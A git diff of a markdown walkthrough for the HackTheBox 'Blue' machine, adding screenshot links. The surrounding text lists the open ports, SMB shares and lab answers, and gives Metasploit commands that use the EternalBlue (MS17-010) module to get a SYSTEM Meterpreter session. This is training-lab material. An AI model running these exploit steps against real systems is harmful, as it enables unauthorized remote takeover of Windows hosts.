@@ -11,6 +11,8 @@
 
 ### 🔍 Task 1: How many open TCP ports are listening on Blue?  
 **Answer**: `3`  
+![nmap](img/nmap.png)
+
 > Exclude 5-digit ephemeral ports  
 ```bash
 135/tcp   open  msrpc
@@ -37,6 +39,8 @@
 ```bash
 smbclient -L 10.129.114.255
 ```
+![smbclient](img/smbclient.png)
+
 ```
 ADMIN$  
 C$  
@@ -48,18 +52,23 @@ Users
 ---
 
 ### 🛡️ Task 5: What 2017 Microsoft Security Bulletin describes SMB RCE?  
-**Answer**: `MS17-010`
+**Answer**: `MS17-010`  
+![ms2017-010](img/ms2017-010.png)
 
 ---
 
 ### 🐛 Task 6 (Optional): Famous malware using MS17-010?  
-**Answer**: `WannaCry`
+**Answer**: `WannaCry`  
+![wannacry](img/wannacry.png)
 
 ---
 
 ### 💥 Task 7: What user do you get execution with when exploiting MS17-010?  
 **Answer**: `NT AUTHORITY\SYSTEM`  
-> Obtained via Metasploit EternalBlue module:
+
+> Obtained via Metasploit EternalBlue module:  
+![searchslploit](img/searchslploit.png)
+
 ```bash
 search eternalblue
 use 0
@@ -67,6 +76,8 @@ set RHOSTS 10.129.114.255
 set LHOST 10.10.14.99
 run
 ```
+![metasploit](img/metasploit.png)
+
 > Meterpreter output:
 ```bash
 getuid
